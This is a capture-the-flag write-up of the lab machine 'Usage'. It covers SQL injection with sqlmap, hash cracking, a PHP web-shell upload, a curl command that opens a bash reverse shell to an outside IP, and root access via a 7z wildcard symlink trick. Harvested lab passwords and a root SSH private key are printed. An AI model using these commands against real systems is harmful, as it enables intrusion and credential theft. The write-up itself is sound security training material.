# Enumeration

## NMAP

```bash
nmap -sC -sV -Pn -p- 10.10.11.18 -T5        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-27 09:41 EDT
Nmap scan report for 10.10.11.18
Host is up (0.048s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.33 seconds

```

We try to use sqlinjection on the reset page
![picture alt](assets/reset_inj.png)

![picture alt](assets/500_error.png)

We can confirm that the email is injectable with:

![picture alt](assets/injectable_email.png)

After intercepting the request with BurpSuite we can use sqlmap to attack the reset form

![picture alt](assets/reset_req.png)

```bash
sqlmap -r reset.req -p email --level 5 --risk 3 --technique=B --batch
```

```
        ___
       __H__                                                                                                                                                                                                                                                                      
 ___ ___[.]_____ ___ ___  {1.9.3#stable}                                                                                                                                                                                                                                          
|_ -| . [)]     | .'| . |                                                                                                                                                                                                                                                         
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                                                                                                         
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                                                      

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:25:09 /2025-04-27/

[10:25:09] [INFO] parsing HTTP request from 'reset.req'
[10:25:09] [INFO] testing connection to the target URL
got a 302 redirect to 'http://usage.htb/index.php/forget-password'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
[10:25:10] [INFO] testing if the target URL content is stable
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
[10:25:10] [WARNING] heuristic (basic) test shows that POST parameter 'email' might not be injectable
[10:25:10] [INFO] testing for SQL injection on POST parameter 'email'
[10:25:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:25:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[10:25:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[10:26:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[10:26:19] [INFO] POST parameter 'email' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[10:26:21] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[10:26:21] [INFO] checking if the injection point on POST parameter 'email' is a false positive
POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 338 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=lMY8oaxBR58STgl60nYUgq4YF7YrknKTzDT6BQoB&email=test@test.htb' AND 8351=(SELECT (CASE WHEN (8351=8351) THEN 8351 ELSE (SELECT 4051 UNION SELECT 2471) END))-- hspf
---
[10:26:26] [INFO] testing MySQL
[10:26:26] [INFO] confirming MySQL
[10:26:27] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 8.0.0
[10:26:27] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 128 times
[10:26:27] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/usage.htb'

```

We found the injection and now we can enumerate the databases

```bash
 sqlmap -r reset.req -p email --level 5 --risk 3 --technique=B --batch -dbs
```

```
       ___
       __H__                                                                                                                                                                                                                                                                      
 ___ ___["]_____ ___ ___  {1.9.3#stable}                                                                                                                                                                                                                                          
|_ -| . [,]     | .'| . |                                                                                                                                                                                                                                                         
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                                                                                         
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                                                      

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:28:29 /2025-04-27/

[10:28:29] [INFO] parsing HTTP request from 'reset.req'
[10:28:29] [INFO] resuming back-end DBMS 'mysql' 
[10:28:29] [INFO] testing connection to the target URL
got a 302 redirect to 'http://usage.htb/index.php/forget-password'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=lMY8oaxBR58STgl60nYUgq4YF7YrknKTzDT6BQoB&email=test@test.htb' AND 8351=(SELECT (CASE WHEN (8351=8351) THEN 8351 ELSE (SELECT 4051 UNION SELECT 2471) END))-- hspf
---
[10:28:30] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 8
[10:28:30] [INFO] fetching database names
[10:28:30] [INFO] fetching number of databases
[10:28:30] [INFO] resumed: 3
[10:28:30] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[10:28:30] [INFO] retrieved: 
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
information_schema
[10:28:51] [INFO] retrieved: performance_schema
[10:29:13] [INFO] retrieved: usage_blog
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog

[10:29:25] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 152 times
[10:29:25] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/usage.htb'

[*] ending @ 10:29:25 /2025-04-27/

```

Now we can dump the `usage_blog` database

```bash
 sqlmap -r reset.req -p email --level 5 --risk 3 --technique=B --batch --dump usage_blog
```

After dumping the database we find a table name admin_users with a user `admin` and password `whatever1` (after cracking it using hashcat)

```bash
2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1
                                                        
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: usage_hashes
Time.Started.....: Sun Apr 27 13:29:18 2025 (19 secs)
Time.Estimated...: Sun Apr 27 13:29:37 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       85 H/s (5.28ms) @ Accel:6 Loops:16 Thr:1 Vec:1
Recovered........: 3/3 (100.00%) Digests (total), 1/3 (33.33%) Digests (new), 3/3 (100.00%) Salts
Progress.........: 4788/43033155 (0.01%)
Rejected.........: 0/4788 (0.00%)
Restore.Point....: 1584/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1008-1024
Candidate.Engine.: Device Generator
Candidates.#1....: alexis1 -> serena
Hardware.Mon.#1..: Util: 74%

Started: Sun Apr 27 13:29:14 2025
Stopped: Sun Apr 27 13:29:39 2025

```

Login in the admin page we can see that the site uses `laravel-admin 1.18.0`

# Foothold

## Vulnerability Search

| Source | Link                                            |
| ------ | ----------------------------------------------- |
| NIST   | https://nvd.nist.gov/vuln/detail/CVE-2023-24249 |
| POC    | https://flyd.uk/post/cve-2023-24249/            |

The site allows the upload of a php file via the post request on the submit in the user profile.

So we can intercept the request with BurpSuite and then alter the avatar field to create the `shell.php` file

![picture alt](assets/rev_shell.png)

![picture alt](assets/user_flag.png)

```bash
curl http://admin.usage.htb/uploads/images/shell.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/10.10.14.15/4444+0%3E%261%27
```

![picture alt](assets/user_flag.png)

```bash
dash@usage:/var/www/html/project_admin$ cat .env
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:oMsNNEsunFZxVvNVc0pfq7Gbn8hWGURpQLAgH6/dktA=
APP_DEBUG=false
APP_URL=http://admin.usage.htb

LOG_CHANNEL=stack
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=usage_blog
DB_USERNAME=staff
DB_PASSWORD=s3cr3t_c0d3d_1uth

BROADCAST_DRIVER=log

```

```bash
cat .monitrc 
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert


#System Monitoring 
check system usage
    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert 
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert

```

Looking through the files in the /var/www and /home/dash directories we find 2 passwords `3nc0d3d_pa$$w0rd` and `s3cr3t_c0d3d_1uth`

The first password is for the user `xander` in the system.

```bash
xander@usage:~$ sudo -l 
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

We discovered that the `xander` user has privilege on the `/usr/bin/usage_management`

Running strings on the binary we can see it uses a 7z command with an `*` at the end.

```bash
strings sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1;!^H^H^H

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=C.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7513 32-Core Processor                 (A00F11),ASM,AES-NI)

Scanning the drive:
2984 folders, 17946 files, 113879219 bytes (109 MiB)                       

Creating archive: /var/backups/project.zip

Items to compress: 20930

                                                                             
Files read from disk: 17946
Archive size: 54830200 bytes (53 MiB)
Everything is Ok
xander@usage:~$ strings /usr/bin/usage_management
/lib64/ld-linux-x86-64.so.2
chdir
__cxa_finalize
__libc_start_main
puts
system
__isoc99_scanf
perror
printf
libc.so.6
GLIBC_2.7
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
/var/www/html
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
Error changing working directory to /var/www/html
/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
```

Following this [HackTrick](https://www.google.com/search?q=wildcard+hacktrics+7z&client=firefox-b-e&sca_esv=dd2f1766d71666ee&channel=entpr&ei=QIMOaNyBKojr7_UP07D_uAY&ved=0ahUKEwjcoYeS9_iMAxWI9bsIHVPYH2cQ4dUDCBA&uact=5&oq=wildcard+hacktrics+7z&gs_lp=Egxnd3Mtd2l6LXNlcnAiFXdpbGRjYXJkIGhhY2t0cmljcyA3ejIHECEYoAEYCjIHECEYoAEYCjIHECEYoAEYCkjRHlCxBligHXABeAGQAQCYAYsBoAHZAqoBAzAuM7gBA8gBAPgBAZgCBKAC8gLCAgoQABiwAxjWBBhHwgIJEAAYxwMYDRgewgIIEAAYgAQYogTCAgUQABjvBZgDAOIDBRIBMSBAiAYBkAYIkgcDMS4zoAe-CrIHAzAuM7gH6QI&sclient=gws-wiz-serp) and then running the binary with option 1 we can get the RSA key of the root user or read any file in the system.


```bash
xander@usage:~$ cd /var/www/html
xander@usage:/var/www/html$ touch @id_rsa
xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa
```

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
-----END OPENSSH PRIVATE KEY-----

```